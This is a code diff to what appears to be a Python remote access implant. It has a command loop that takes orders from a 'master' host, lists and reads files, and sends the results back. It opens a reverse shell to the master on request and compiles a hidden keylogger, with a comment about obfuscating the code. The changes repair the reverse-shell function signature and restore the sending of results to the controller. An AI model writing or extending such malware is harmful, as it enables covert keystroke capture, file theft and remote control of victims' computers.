@@ -9,7 +9,7 @@ from time import sleep
 from .crypto import crypto_run
 
 
-def reverse_shell():
+def reverse_shell(master_hostname, shell_port):
     pid = fork()
     if pid == 0:
         pid2 = fork()
@@ -28,9 +28,9 @@ def compile_keylogger():
     if pid == 0:
         pid2 = fork()
         if pid2 == 0:
-            # export cls="/usr/bin/gcc linux_keylogger/src/linux_keylogger.c -o top"
+            # export cls="/usr/bin/gcc keylogger.c -o top"
             # code script to copy ove all c code on one file and obfuscate it as well
-            system("gcc linux_keylogger/src/keylogger.c -o keylogger >/dev/null 2>&1")
+            system("gcc keylogger.c -o keylogger >/dev/null 2>&1")
             exit(0)
         exit(0)
 
@@ -85,10 +85,10 @@ def cmd_shell(conn, master_hostname, master_port):
             resp_list = listdir(path)
             for resp in resp_list:
                 res += resp + "\n"
-
+            conn = send_res(conn, res)
         elif cmd[:3] == "pwd":
             res = str(getcwd())
-
+            conn = send_res(conn, res)
         elif cmd[:3] == "cat":
             data = ""
             try:
@@ -118,7 +118,7 @@ def cmd_shell(conn, master_hostname, master_port):
         elif cmd[:5] == "shell":
             shell_port = int(cmd[5:])
             sleep(1)
-            reverse_shell(conn, master_hostname, shell_port)
+            reverse_shell(master_hostname, shell_port)
         
         elif cmd[:6] == "keylog":
             compile_keylogger()
